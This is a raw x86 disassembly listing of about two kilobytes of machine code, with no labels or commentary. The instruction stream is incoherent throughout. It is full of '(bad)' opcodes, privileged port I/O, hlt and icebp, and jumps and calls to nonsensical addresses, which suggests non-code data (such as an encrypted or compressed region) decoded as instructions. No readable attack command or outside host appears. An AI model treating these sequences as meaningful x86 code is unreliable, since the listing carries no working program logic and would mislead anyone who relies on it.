  415d5d:	pop    ebx
  415d5e:	popa   
  415d5f:	dec    ecx
  415d60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d61:	retf   
  415d62:	jnp    0x415dc2
  415d64:	fmul   DWORD PTR [ebx+0x7a]
  415d67:	shl    BYTE PTR [ebp-0x32],1
  415d6a:	outs   dx,BYTE PTR ds:[esi]
  415d6b:	push   edi
  415d6c:	shr    BYTE PTR [ecx],cl
  415d6e:	data16 adc al,0x66
  415d71:	mov    bh,0x62
  415d73:	sbb    ch,dl
  415d75:	mov    dh,0xff
  415d77:	into   
  415d78:	xlat   BYTE PTR ds:[ebx]
  415d79:	xchg   ecx,eax
  415d7a:	imul   edx,DWORD PTR [edx+ebx*4+0x72822184],0x115851d7
  415d85:	xlat   BYTE PTR ds:[ebx]
  415d86:	sti    
  415d87:	jecxz  0x415d7b
  415d89:	jnp    0x415e00
  415d8b:	aam    0xdb
  415d8d:	jnp    0x415d55
  415d8f:	call   0xbfefb092
  415d94:	out    dx,eax
  415d95:	aaa    
  415d96:	out    0x7e,al
  415d98:	ror    BYTE PTR [ebx+0x14],cl
  415d9b:	int3   
  415d9c:	xlat   BYTE PTR ds:[ebx]
  415d9d:	jnp    0x415dd4
  415d9f:	test   eax,0x83fda287
  415da4:	je     0x415d6d
  415da6:	mov    bh,0x70
  415da8:	(bad)  
  415da9:	(bad)  
  415daa:	dec    DWORD PTR [ebx-0x2c32e4a9]
  415db0:	fcmovbe st,st(6)
  415db2:	jno    0x415e14
  415db4:	fwait
  415db5:	dec    ebx
  415db6:	cld    
  415db7:	retf   
  415db8:	xlat   BYTE PTR ds:[ebx]
  415db9:	and    edx,ecx
  415dbb:	rcr    edx,cl
  415dbd:	(bad)  
  415dbe:	out    0x95,al
  415dc0:	xlat   BYTE PTR ds:[ebx]
  415dc1:	pop    ecx
  415dc2:	imul   ecx,DWORD PTR [ecx-0x74],0xd2eaeed2
  415dc9:	add    eax,0x29b3f088
  415dce:	les    ebp,FWORD PTR [ebp+0x2d]
  415dd1:	jo     0x415d9b
  415dd3:	shr    DWORD PTR [edx-0x2450969e],cl
  415dd9:	(bad)  
  415dda:	jno    0x415db0
  415ddc:	fld    st(2)
  415dde:	cmp    edx,esi
  415de0:	in     al,dx
  415de1:	dec    edx
  415de2:	sub    al,0xcc
  415de4:	xlat   BYTE PTR ds:[ebx]
  415de5:	push   ebx
  415de6:	rcl    ebx,1
  415de8:	fcmovbe st,st(6)
  415dea:	outs   dx,BYTE PTR ds:[esi]
  415deb:	push   ecx
  415dec:	ss (bad) 
  415dee:	jno    0x415dc4
  415df0:	lahf   
  415df1:	out    0xfe,al
  415df3:	or     DWORD PTR [edi+0x4b],ecx
  415df6:	lods   eax,DWORD PTR ds:[esi]
  415df7:	rcr    edx,cl
  415df9:	(bad)  
  415dfa:	mov    cs,ebx
  415dfc:	(bad)  [eax+0x69]
  415dff:	in     al,dx
  415e00:	(bad)  
  415e02:	jno    0x415dd8
  415e04:	jbe    0x415e3b
  415e06:	inc    ecx
  415e07:	aam    0xda
  415e09:	(bad)  
  415e0a:	out    0x93,al
  415e0c:	into   
  415e0d:	dec    ebx
  415e0e:	xor    eax,ecx
  415e10:	dec    edi
  415e11:	mov    ds,WORD PTR [ecx+0x49]
  415e14:	test   esi,ecx
  415e16:	cmp    BYTE PTR [edx+eax*8-0x25b6979e],al
  415e1d:	popf   
  415e1e:	sub    DWORD PTR [ebp+eiz*2+0x4fa485e2],edi
  415e25:	mov    ecx,DWORD PTR [ecx-0x2f]
  415e28:	(bad)  
  415e29:	into   
  415e2a:	call   0x248f1cba
  415e2f:	rcl    BYTE PTR [ebx],1
  415e31:	xchg   esi,eax
  415e32:	push   ecx
  415e33:	rcr    edx,cl
  415e35:	(bad)  
  415e36:	jno    0x415ea6
  415e38:	jecxz  0x415dcc
  415e3a:	pop    ebx
  415e3b:	aam    0xba
  415e3d:	popa   
  415e3e:	push   0xd
  415e40:	xchg   ebp,eax
  415e41:	(bad)  
  415e42:	jno    0x415e18
  415e44:	fcmovbe st,st(6)
  415e46:	stos   BYTE PTR es:[edi],al
  415e47:	(bad)  
  415e48:	mov    dh,0xba
  415e4a:	jno    0x415e20
  415e4c:	fcmovbe st,st(6)
  415e4e:	adc    BYTE PTR [ebx],cl
  415e50:	sbb    dl,dl
  415e52:	jno    0x415ebe
  415e54:	fisubr DWORD PTR [esi-0x5b]
  415e57:	cmp    al,0xca
  415e59:	mov    cl,0x72
  415e5b:	pop    esi
  415e5c:	jmp    0x23d6:0xdbd8ebed
  415e63:	pushf  
  415e64:	add    BYTE PTR [esi+0x39],0xd1
  415e68:	je     0x415e3e
  415e6a:	ins    DWORD PTR es:[edi],dx
  415e6b:	retf   
  415e6c:	imul   edx,edi,0x45181bef
  415e72:	jo     0x415e08
  415e74:	sbb    cl,al
  415e76:	stos   DWORD PTR es:[edi],eax
  415e77:	fcmovnbe st,st(1)
  415e79:	mov    edx,0xde20b563
  415e7e:	jo     0x415ea0
  415e80:	ror    DWORD PTR [ecx],1
  415e82:	push   eax
  415e83:	sbb    al,0xd9
  415e85:	mov    dh,BYTE PTR [ecx+0x86e86c9]
  415e8b:	popa   
  415e8c:	mov    edx,0x6b6201c8
  415e91:	outs   dx,DWORD PTR ds:[esi]
  415e92:	or     dh,BYTE PTR [ebx+0x6d]
  415e95:	dec    edi
  415e96:	push   cs
  415e97:	lea    ebp,[edi+esi*4+0x22]
  415e9b:	pusha  
  415e9c:	repz jae 0x415eab
  415e9f:	and    eax,0x3c12610b
  415ea4:	jno    0x415e76
  415ea6:	sub    eax,0x6e835c85
  415eab:	imul   esi,DWORD PTR [bp+si+0xc],0xffffffa6
  415eb0:	int    0x4d
  415eb2:	addr16 mov al,0x8e
  415eb5:	xchg   edx,eax
  415eb6:	push   0xffffffd3
  415eb8:	inc    ecx
  415eb9:	ficom  DWORD PTR [edi]
  415ebb:	xchg   ecx,eax
  415ebc:	loop   0x415f01
  415ebe:	addr16 jl 0x415e97
  415ec1:	jle    0x415ef6
  415ec3:	outs   dx,DWORD PTR ds:[esi]
  415ec4:	into   
  415ec5:	lods   al,BYTE PTR ds:[esi]
  415ec6:	adc    cl,ah
  415ec8:	pop    esi
  415ec9:	sahf   
  415eca:	adc    bl,BYTE PTR cs:[ebp+ebx*4-0x554593b1]
  415ed2:	jecxz  0x415e63
  415ed4:	xchg   esp,eax
  415ed5:	mov    WORD PTR ds:0x24cec954,?
  415edb:	int3   
  415edc:	fstp   DWORD PTR [esi-0xab85fa2]
  415ee2:	dec    eax
  415ee3:	fist   DWORD PTR [ebx-0x3a]
  415ee6:	mov    dl,0xfb
  415ee8:	pop    edx
  415ee9:	adc    DWORD PTR [eax*4-0x34186656],esp
  415ef0:	rcr    BYTE PTR [ebx],cl
  415ef2:	cmc    
  415ef3:	nop
  415ef4:	cwde   
  415ef5:	mov    ch,0x62
  415ef7:	push   edx
  415ef8:	mov    BYTE PTR [ebp+0xe],ch
  415efb:	ins    BYTE PTR es:[edi],dx
  415efc:	push   edx
  415efd:	jbe    0x415eb4
  415eff:	or     DWORD PTR [edx-0x26780e6f],0x66
  415f06:	outs   dx,DWORD PTR ds:[esi]
  415f07:	retf   0xe1e3
  415f0a:	add    BYTE PTR [ebp+0x529112c6],al
  415f10:	rcl    ch,1
  415f12:	or     dx,cx
  415f15:	pop    DWORD PTR [ecx+0x6af0c5cf]
  415f1b:	rol    cl,0xc5
  415f1e:	mov    ah,0xc8
  415f20:	retf   0x4d14
  415f23:	iret   
  415f24:	nop
  415f25:	xchg   ebp,eax
  415f26:	gs (bad) 
  415f28:	fmul   st,st(1)
  415f2a:	arpl   bx,dx
  415f2c:	cdq    
  415f2d:	int3   
  415f2e:	imul   esp,DWORD PTR [esi+esi*4+0x56],0x49798f65
  415f36:	clc    
  415f37:	into   
  415f38:	xchg   ebx,eax
  415f39:	mov    bh,0x84
  415f3b:	or     ch,0x9e
  415f3e:	pop    eax
  415f3f:	int3   
  415f40:	xor    edi,eax
  415f42:	xor    eax,0xfe6ce6f1
  415f47:	jae    0x415f92
  415f49:	pop    ebp
  415f4a:	pop    ecx
  415f4b:	mov    ah,0xca
  415f4d:	xchg   DWORD PTR [eax],ebp
  415f4f:	repz adc ch,0x75
  415f53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f54:	mov    esi,0xf15c0c62
  415f59:	dec    eax
  415f5a:	fadd   st(7),st
  415f5c:	dec    ecx
  415f5d:	push   ecx
  415f5e:	ja     0x415f2f
  415f60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f61:	push   ds
  415f62:	outs   dx,DWORD PTR ds:[esi]
  415f63:	les    edx,FWORD PTR [edi-0x2f79e25c]
  415f69:	lea    edx,[ecx-0x37]
  415f6c:	int3   
  415f6d:	test   al,0xff
  415f6f:	pusha  
  415f70:	nop
  415f71:	jae    0x415fd7
  415f73:	mov    edi,0xc2d5327a
  415f78:	add    ch,0x73
  415f7b:	iret   
  415f7c:	es mov edx,0x57d9a949
  415f82:	cdq    
  415f83:	or     BYTE PTR [edi],al
  415f85:	data16 data16 mov BYTE PTR [ebx+0x38a9b1cc],ch
  415f8d:	cld    
  415f8e:	jmp    FWORD PTR [ebp-0x26]
  415f91:	xlat   BYTE PTR ds:[ebx]
  415f92:	inc    ebx
  415f93:	ss push ebx
  415f95:	xchg   BYTE PTR [ebp+ebx*4+0x205eb6f2],al
  415f9c:	inc    ebp
  415f9d:	xchg   edi,eax
  415f9e:	push   esp
  415f9f:	push   eax
  415fa0:	adc    BYTE PTR [esi],0xc0
  415fa3:	sbb    al,0xc4
  415fa5:	imul   ecx,DWORD PTR [ebp-0x54aa25b7],0x324678a5
  415faf:	fwait
  415fb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fb1:	push   edi
  415fb2:	and    bl,BYTE PTR [ebx+eax*8+0x33ad71b4]
  415fb9:	dec    esi
  415fba:	sbb    al,0x83
  415fbc:	ins    DWORD PTR es:[edi],dx
  415fbd:	sub    eax,0xf99da262
  415fc2:	pop    esp
  415fc3:	hlt    
  415fc4:	jp     0x415f8c
  415fc6:	dec    ecx
  415fc7:	jb     0x415fa1
  415fc9:	(bad)  
  415fca:	jbe    0x415f78
  415fcc:	dec    esp
  415fcd:	or     esi,DWORD PTR [ebp+0x6ecb727b]
  415fd3:	pop    ds
  415fd4:	lods   eax,DWORD PTR ds:[esi]
  415fd5:	cmp    DWORD PTR [eax],ebp
  415fd7:	sub    BYTE PTR [ecx],bh
  415fd9:	dec    ebx
  415fda:	arpl   WORD PTR [eax+eax*1],ax
  415fdd:	rcl    DWORD PTR [ecx],1
  415fdf:	sar    ebx,1
  415fe1:	ror    DWORD PTR ds:0xd9084e19,0xba
  415fe8:	adc    BYTE PTR [ebp+0x71],cl
  415feb:	aad    0x71
  415fed:	aas    
  415fee:	stos   DWORD PTR es:[edi],eax
  415fef:	es push edx
  415ff1:	rcl    BYTE PTR [edi-0x2c],1
  415ff4:	xlat   BYTE PTR ds:[ebx]
  415ff5:	inc    esp
  415ff6:	ret    
  415ff7:	add    DWORD PTR ds:0x7abaf36e,0x5f
  415ffe:	mov    ecx,0xef8edca7
  416003:	ror    DWORD PTR [eax+0x515f039b],cl
  416009:	jmp    0x415f9a
  41600b:	cmp    BYTE PTR [edi-0x50],bl
  41600e:	jno    0x415faa
  416010:	sbb    ebx,DWORD PTR [ebp+0x739918f9]
  416016:	cmc    
  416017:	pop    edx
  416018:	jns    0x415ff2
  41601a:	cmp    eax,0xb1d5fef0
  41601f:	ins    DWORD PTR es:[edi],dx
  416020:	jecxz  0x415fd2
  416022:	inc    ebx
  416023:	fwait
  416024:	mov    DWORD PTR [edx+0x5d66388b],edi
  41602a:	push   ebx
  41602b:	imul   esi,DWORD PTR [ebp+0x15],0xbd23ebf1
  416032:	mov    edi,0x99d63159
  416037:	push   ebp
  416038:	in     eax,0x20
  41603a:	out    dx,eax
  41603b:	sar    BYTE PTR [ebx],0xac
  41603e:	lea    eax,[ebx+edx*8]
  416041:	rcl    DWORD PTR [esi+ebp*4+0x3030c6dd],cl
  416048:	(bad)
  41604b:	cmp    al,0x71
  41604d:	mov    eax,0xd6ab3b4e
  416052:	retf   0xc3c0
  416055:	jne    0x416097
  416057:	test   eax,0xab9a56da
  41605c:	adc    DWORD PTR [ebx],0xd5e666f4
  416062:	shr    DWORD PTR [eax],0x7c
  416065:	dec    edx
  416066:	ror    DWORD PTR [edi-0x108e5887],cl
  41606c:	js     0x41607c
  41606e:	mov    ch,0x3a
  416070:	jne    0x416068
  416072:	aam    0xd3
  416074:	or     BYTE PTR [ecx+0x20],ah
  416077:	dec    esp
  416078:	popa   
  416079:	jbe    0x41605e
  41607b:	add    ebx,edx
  41607d:	pushf  
  41607e:	inc    edx
  41607f:	ficom  DWORD PTR [ebx]
  416081:	sbb    ch,ch
  416083:	mov    fs,WORD PTR [eax]
  416085:	mov    eax,0x13ad942b
  41608a:	cmp    ah,cl
  41608c:	dec    edx
  41608d:	mov    edx,0x3184a7a9
  416092:	jno    0x416035
  416094:	lds    ebx,FWORD PTR [ecx-0x4d136de4]
  41609a:	out    0xd3,eax
  41609c:	mov    WORD PTR [edx-0x43f914e],ds
  4160a2:	adc    eax,0xa1cda07
  4160a7:	lahf   
  4160a8:	jl     0x41604c
  4160aa:	mov    ds:0xd95a0e04,eax
  4160af:	shl    DWORD PTR [ecx+0x34d4e2c7],cl
  4160b5:	mov    dh,cl
  4160b7:	xchg   dl,bl
  4160b9:	test   eax,0xc0f4629e
  4160be:	sbb    al,0xe4
  4160c0:	ins    DWORD PTR es:[edi],dx
  4160c1:	(bad)  
  4160c2:	test   DWORD PTR [ebx-0x66],esp
  4160c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160c6:	mov    dh,0x7f
  4160c8:	adc    ebx,DWORD PTR [ecx+0x71]
  4160cb:	xchg   esi,eax
  4160cc:	mov    WORD PTR [ecx+0x4e4037ee],ss
  4160d2:	popa   
  4160d3:	aam    0xaf
  4160d5:	add    eax,esp
  4160d7:	mov    esi,ecx
  4160d9:	xor    al,0xab
  4160db:	iret   
  4160dc:	fisub  DWORD PTR [ebx-0x41f17180]
  4160e2:	je     0x4160db
  4160e4:	pop    esp
  4160e5:	fs mov dl,bl
  4160e8:	cld    
  4160e9:	xor    DWORD PTR [ebp-0xd],0xbc8d721b
  4160f0:	ficom  DWORD PTR [ebp+0x6a]
  4160f3:	sub    eax,0xaf03319f
  4160f8:	jno    0x4160d0
  4160fa:	pusha  
  4160fb:	outs   dx,BYTE PTR cs:[esi]
  4160fd:	bsf    esp,DWORD PTR ds:0x5af69f60
  416104:	out    dx,al
  416105:	mov    ecx,0x56059635
  41610a:	icebp  
  41610b:	arpl   di,dx
  41610d:	cmp    ebp,DWORD PTR ds:0xeed62d4a
  416113:	call   0x25898505
  416118:	shr    BYTE PTR [eax+0x55],0x96
  41611c:	stos   DWORD PTR es:[edi],eax
  41611d:	pop    esp
  41611e:	jno    0x416112
  416120:	in     eax,0x73
  416122:	call   0x15175dcf
  416127:	imul   DWORD PTR [edi+edi*8+0x6a4483ff]
  41612e:	xor    eax,0xdd4f2d4f
  416133:	inc    edi
  416134:	xor    BYTE PTR [esi],bl
  416136:	adc    DWORD PTR [edx],edx
  416138:	jno    0x41613a
  41613a:	outs   dx,BYTE PTR ds:[esi]
  41613b:	aam    0x50
  41613d:	mov    bl,0xf3
  41613f:	(bad)  
  416140:	xor    bl,BYTE PTR [edi-0x76]
  416143:	cli    
  416144:	mov    esp,0x5aa6dd72
  416149:	pop    ss
  41614a:	dec    ebx
  41614b:	add    al,0xae
  41614d:	scas   al,BYTE PTR es:[edi]
  41614e:	inc    edi
  41614f:	int    0x83
  416151:	ins    DWORD PTR es:[edi],dx
  416152:	scas   eax,DWORD PTR es:[edi]
  416153:	jge    0x4160f4
  416155:	inc    esi
  416156:	jl     0x4161bf
  416158:	ins    BYTE PTR es:[edi],dx
  416159:	clc    
  41615a:	jo     0x4161a6
  41615c:	fdivr  QWORD PTR [esi+eax*8]
  41615f:	xchg   eax,ebp
  416161:	call   FWORD PTR [eax-0x3fe0eb2d]
  416167:	aaa    
  416168:	shr    DWORD PTR [eax],cl
  41616a:	loop   0x4161d6
  41616c:	fxch   st(5)
  41616e:	dec    esi
  41616f:	dec    ebx
  416170:	add    esi,DWORD PTR [edi+0x5f697d0]
  416176:	jmp    0x1ee0:0x491167d3
  41617d:	sbb    BYTE PTR [edx],0xb0
  416180:	dec    edx
  416181:	sbb    dh,BYTE PTR [ecx+0x49]
  416184:	mov    ebx,fs
  416186:	(bad)  
  416187:	mov    dh,0x82
  416189:	sbb    ecx,esp
  41618b:	sar    DWORD PTR [ebx],cl
  41618d:	outs   dx,BYTE PTR ds:[esi]
  41618e:	xor    ecx,DWORD PTR [ebx+eiz*1+0x15]
  416192:	xchg   ecx,eax
  416193:	mov    dl,0xe4
  416195:	cwde   
  416196:	jno    0x4161b3
  416198:	mov    WORD PTR [ebp-0x315aa674],ss
  41619e:	mov    edx,ebx
  4161a0:	push   ecx
  4161a1:	cs cdq 
  4161a3:	pop    esi
  4161a4:	test   DWORD PTR [esi],edi
  4161a6:	je     0x416223
  4161a8:	fiadd  DWORD PTR [ebx-0x7b5072a]
  4161ae:	aas    
  4161af:	jnp    0x416168
  4161b1:	(bad)  
  4161b2:	es adc al,0xd6
  4161b5:	mov    edx,0x9a100cbd
  4161ba:	jno    0x416192
  4161bc:	int3   
  4161bd:	adc    eax,esi
  4161bf:	loope  0x41616f
  4161c1:	add    BYTE PTR [edx-0x69],ch
  4161c4:	not    BYTE PTR [eax]
  4161c6:	icebp  
  4161c7:	xchg   DWORD PTR [edi-0x71],eax
  4161ca:	ins    DWORD PTR es:[edi],dx
  4161cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161cc:	jo     0x4161b1
  4161ce:	ins    DWORD PTR es:[edi],dx
  4161cf:	or     al,0xb3
  4161d1:	and    DWORD PTR [edi-0x5e],ebx
  4161d4:	pop    es
  4161d5:	push   ss
  4161d6:	fbstp  TBYTE PTR [esp+eiz*8-0x2c]
  4161da:	and    BYTE PTR ds:0x22c4bbcd,cl
  4161e0:	or     al,0x66
  4161e2:	cmp    DWORD PTR [ebp-0x26],eax
  4161e5:	cmp    eax,0xf8d97b51
  4161ea:	(bad)  
  4161ed:	out    dx,al
  4161ee:	inc    eax
  4161ef:	int    0x98
  4161f1:	mov    al,0xa9
  4161f3:	sahf   
  4161f4:	dec    edi
  4161f5:	push   ss
  4161f6:	ss jge 0x416261
  4161f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161fa:	pop    ecx
  4161fb:	out    dx,al
  4161fc:	in     al,dx
  4161fd:	es inc ecx
  4161ff:	es jge 0x4161d8
  416202:	adc    edi,edi
  416204:	add    ch,ah
  416206:	dec    edi
  416207:	mov    BYTE PTR ss:[ecx+0x71],dl
  41620b:	pop    eax
  41620c:	ja     0x416198
  41620e:	imul   eax,DWORD PTR [ecx],0xd45c2dbf
  416214:	jo     0x416197
  416216:	xor    DWORD PTR [ebp-0x7aa51d0e],ebx
  41621c:	loopne 0x4161ed
  41621e:	jno    0x416295
  416220:	cs scas eax,DWORD PTR es:[edi]
  416222:	clc    
  416223:	inc    eax
  416224:	lahf   
  416225:	rcr    eax,0xd3
  416228:	sar    BYTE PTR [edi-0x3d],0xb7
  41622c:	nop
  41622d:	cmp    esp,DWORD PTR [ebx+0x22dcdaea]
  416233:	imul   edx
  416235:	xor    ebp,DWORD PTR [ebx+ebx*1+0x76]
  416239:	iret   
  41623a:	sub    eax,0x39
  41623d:	cli    
  41623e:	lea    eax,[edx+0xfe0296f]
  416244:	add    eax,0xa537713e
  416249:	out    0x65,al
  41624b:	add    esi,DWORD PTR [ecx+0x2]
  41624e:	cld    
  41624f:	rol    DWORD PTR [ebx],cl
  416251:	mov    eax,0xae9f8140
  416256:	nop
  416257:	jmp    0xf784b2f
  41625c:	pop    ebp
  41625d:	out    dx,eax
  41625e:	int    0xf3
  416260:	(bad)  
  416261:	(bad)  
  416262:	cmp    eax,0x2cd69ab6
  416267:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416268:	js     0x4162e7
  41626a:	ror    DWORD PTR [edx],1
  41626c:	shl    DWORD PTR fs:0x69e07f41,0xc8
  416274:	imul   edx,edx,0x36bbc5ae
  41627a:	icebp  
  41627b:	add    BYTE PTR [esi-0x392c753a],al
  416281:	int    0xca
  416283:	and    ch,BYTE PTR [ebp+edx*8+0x5bd3c342]
  41628a:	jae    0x416264
  41628c:	bound  esi,QWORD PTR [edx+0x22ea8691]
  416292:	push   cs
  416293:	aam    0x39
  416295:	jecxz  0x416248
  416297:	imul   DWORD PTR [ecx-0x9a499f4]
  41629d:	pop    edi
  41629e:	cmp    BYTE PTR [esi],ah
  4162a0:	push   ds
  4162a1:	(bad)  
  4162a2:	out    0xe8,al
  4162a4:	mov    ds:0xba019d98,eax
  4162a9:	(bad)  
  4162aa:	pushf  
  4162ab:	jle    0x416259
  4162ad:	xchg   edx,eax
  4162ae:	clc    
  4162af:	jge    0x416297
  4162b1:	sti    
  4162b2:	ins    DWORD PTR es:[edi],dx
  4162b3:	fsubr  DWORD PTR [edx+0x28]
  4162b6:	jns    0x416305
  4162b8:	adc    bh,dh
  4162ba:	or     al,0xda
  4162bc:	xor    eax,0x16eef4d6
  4162c1:	and    eax,esi
  4162c3:	cmp    eax,0xbe718f2d
  4162c8:	push   edx
  4162c9:	xchg   ebp,eax
  4162ca:	dec    esp
  4162cb:	jp     0x4162c8
  4162cd:	sub    edx,DWORD PTR [edx+edx*8-0x4ce633dc]
  4162d4:	ds push cs
  4162d6:	sub    edx,DWORD PTR [edi+ebp*8]
  4162d9:	or     BYTE PTR [ecx-0x7b],dh
  4162dc:	or     esi,ebp
  4162de:	ret    0xa807
  4162e1:	cmc    
  4162e2:	push   esi
  4162e3:	aam    0x2b
  4162e5:	test   al,0x7f
  4162e7:	xor    eax,0x5528066f
  4162ec:	fcmovbe st,st(1)
  4162ee:	sub    edx,ecx
  4162f0:	js     0x416350
  4162f2:	stos   DWORD PTR es:[edi],eax
  4162f3:	xchg   edx,eax
  4162f4:	imul   edx,esi,0xffffff96
  4162f7:	ja     0x4162b6
  4162f9:	shl    dh,0x70
  4162fc:	mov    bl,bl
  4162fe:	xor    cl,0xda
  416301:	mov    ch,0x88
  416303:	pop    edi
  416304:	pop    ecx
  416305:	std    
  416306:	ror    ebx,0xf3
  416309:	mov    eax,0xd6d33b60
  41630e:	das    
  41630f:	aaa    
  416310:	ret    0x2969
  416313:	ficom  DWORD PTR es:[ebx-0x3db584de]
  41631a:	lahf   
  41631b:	adc    cl,BYTE PTR [esi-0x2aa6af2a]
  416321:	add    BYTE PTR [edx],bl
  416323:	mov    edi,DWORD PTR [edx+edi*1+0x71]
  416327:	jmp    FWORD PTR [ebx+0x3dfb0d6d]
  41632d:	inc    ebx
  41632e:	inc    ebx
  41632f:	mov    ch,0xf
  416331:	lods   eax,DWORD PTR ds:[esi]
  416332:	in     al,0x13
  416334:	out    0x29,eax
  416336:	mov    ds:0xfffc990a,al
  41633b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41633c:	fisub  DWORD PTR [eax]
  41633e:	sbb    DWORD PTR [edx-0x64],edi
  416341:	pop    ecx
  416342:	dec    esi
  416343:	sahf   
  416344:	jno    0x416300
  416346:	mov    dl,0x4f
  416348:	in     al,0x54
  41634a:	push   esi
  41634b:	inc    ebx
  41634c:	jecxz  0x4162dd
  41634e:	fmul   DWORD PTR [ebx]
  416350:	pop    ds
  416351:	clc    
  416352:	jo     0x416378
  416354:	lahf   
  416355:	sub    ch,dh
  416357:	cld    
  416358:	cmp    bh,BYTE PTR [edi+0x525bc4b0]
  41635e:	xlat   BYTE PTR ds:[ebx]
  41635f:	stos   BYTE PTR es:[edi],al
  416360:	dec    esi
  416361:	test   BYTE PTR [ecx],dl
  416363:	sti    
  416364:	ror    DWORD PTR [eax+0x7bbd1f07],cl
  41636a:	push   ecx
  41636b:	jp     0x4163aa
  41636d:	int    0xc4
  41636f:	push   esi
  416370:	mov    edx,ebp
  416372:	mov    bh,0x7a
  416374:	icebp  
  416375:	xor    ch,BYTE PTR [ebx]
  416377:	pushf  
  416378:	pop    es
  416379:	adc    al,0x11
  41637b:	dec    eax
  41637c:	cld    
  41637d:	sbb    BYTE PTR [ecx-0x4a],dh
  416380:	adc    ebx,DWORD PTR [ebx]
  416382:	add    DWORD PTR [ebp-0x6e],0xb8d42c3f
  416389:	mov    bl,0x7b
  41638b:	test   ch,0x6b
  41638e:	in     al,0xce
  416390:	out    0x9e,al
  416392:	xor    edx,DWORD PTR [ebx+esi*4-0x5fc9667a]
  416399:	add    al,BYTE PTR [esi+0x4d]
  41639c:	pop    es
  41639d:	dec    ebp
  41639e:	repnz out dx,al
  4163a0:	fidiv  DWORD PTR [esi]
  4163a2:	aad    0xf6
  4163a4:	pop    eax
  4163a5:	(bad)  
  4163a6:	dec    esi
  4163a7:	scas   eax,DWORD PTR es:[edi]
  4163a8:	fild   WORD PTR [ecx+0xa77aa67]
  4163ae:	bound  ecx,QWORD PTR [esi+edi*8]
  4163b1:	jmp    0xbe03:0x279353c3
  4163b8:	stos   DWORD PTR es:[edi],eax
  4163b9:	shr    DWORD PTR [ebx],cl
  4163bb:	add    dh,cl
  4163bd:	push   ds
  4163be:	cmp    bh,dl
  4163c0:	pop    ss
  4163c1:	fld    QWORD PTR [eax+0x6e036263]
  4163c7:	fwait
  4163c8:	and    bl,al
  4163ca:	mov    DWORD PTR [eax+0x23],esi
  4163cd:	push   es
  4163ce:	pop    esp
  4163cf:	(bad)  
  4163d1:	into   
  4163d2:	mov    esp,0x3b22068c
  4163d7:	mov    ch,0x9a
  4163d9:	test   al,0xd7
  4163db:	call   0x8b8a:0xf9520539
  4163e2:	xor    DWORD PTR [edx],esi
  4163e4:	jg     0x41645e
  4163e6:	mov    ch,0xba
  4163e8:	ret    0x4ed6
  4163eb:	frstor [eax]
  4163ed:	in     eax,0x63
  4163ef:	inc    eax
  4163f0:	out    dx,eax
  4163f1:	dec    edx
  4163f2:	jo     0x416374
  4163f4:	repnz repnz or DWORD PTR [eax],esp
  4163f8:	jg     0x416437
  4163fa:	cdq    
  4163fb:	les    eax,FWORD PTR [edi]
  4163fd:	(bad)  
  4163fe:	or     eax,0x59bee08a
  416403:	nop
  416404:	dec    edi
  416405:	scas   al,BYTE PTR es:[edi]
  416406:	jno    0x41640e
  416408:	dec    ebx
  416409:	ror    DWORD PTR [edi-0x47a4656b],cl
  41640f:	rcl    BYTE PTR [edi+0x41404b3e],1
  416415:	icebp  
  416416:	shl    BYTE PTR [ecx+0x66700764],0x72
  41641d:	xchg   BYTE PTR [ecx+0x102e30eb],dh
  416423:	add    ebx,DWORD PTR [edx+0x79a9661f]
  416429:	popa   
  41642a:	dec    ebp
  41642b:	(bad)
  41642e:	xor    ecx,ebx
  416430:	cli    
  416431:	outs   dx,BYTE PTR cs:[esi]
  416433:	jmp    0x416484
  416435:	mov    ecx,0x4ee0571
  41643a:	push   es
  41643b:	cmp    eax,ecx
  41643d:	fs loop 0x4163da
  416440:	aad    0xa2
  416442:	icebp  
  416443:	fdiv   QWORD PTR [ebx]
  416445:	push   ebp
  416446:	adc    edx,DWORD PTR [esi+ecx*4-0x68]
  41644a:	outs   dx,BYTE PTR ds:[esi]
  41644b:	test   BYTE PTR [edx+edi*4+0x7d],bl
  41644f:	nop
  416450:	sbb    ch,BYTE PTR [ebx]
  416452:	fwait
  416453:	xor    esi,eax
  416455:	xor    DWORD PTR [edi+edx*4+0x5b],edx
  416459:	xor    DWORD PTR [ecx-0x38],0xcddfa7fa
  416460:	jmp    0x4163ea
  416462:	jno    0x416493
  416464:	cmp    ebx,DWORD PTR [ecx+0xb2a8efb]
  41646a:	pop    ecx
  41646b:	rol    DWORD PTR [edi],cl
  41646d:	(bad)  
  416470:	je     0x4163f9
  416472:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416473:	fbld   TBYTE PTR [ebx]
  416475:	and    BYTE PTR [edx-0xa],0xe3
  416479:	out    0x29,al
  41647b:	adc    al,0xf4
  41647d:	sbb    eax,0xd6186143
  416482:	cmp    esp,eax
  416484:	xor    DWORD PTR [ecx+0x5c95c0e0],eax
  41648a:	jp     0x416487
  41648c:	inc    esp
  41648d:	or     dh,BYTE PTR [ecx-0x78]
  416490:	push   0x368eb5f
  416495:	ficom  WORD PTR [ecx]
  416497:	aam    0xd9
  416499:	push   ecx
  41649a:	outs   dx,BYTE PTR ds:[esi]
  41649b:	inc    edi
  41649c:	sti    
  41649d:	dec    esp
  41649e:	fcomp  QWORD PTR [edi-0x29]
  4164a1:	jb     0x4164a5
  4164a3:	adc    edi,esi
  4164a5:	out    dx,eax
  4164a6:	inc    esp
  4164a7:	xor    ecx,DWORD PTR [eax+0x7b470173]
  4164ad:	es xchg edi,eax
  4164af:	rcr    DWORD PTR [edi-0xf600119],cl
  4164b5:	loop   0x4164f1
  4164b7:	adc    BYTE PTR [ebx+0x1a986416],bh
  4164bd:	cmp    eax,0x22f560e7
  4164c2:	inc    edx
  4164c3:	aam    0x22
  4164c5:	mov    dl,BYTE PTR [edx-0x8]
  4164c8:	call   0xccbaa60c
  4164cd:	das    
  4164ce:	ds mov dl,0xb5
  4164d1:	jno    0x416529
  4164d3:	lods   eax,DWORD PTR ds:[esi]
  4164d4:	pop    ecx
  4164d5:	ret    
  4164d6:	inc    eax
  4164d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
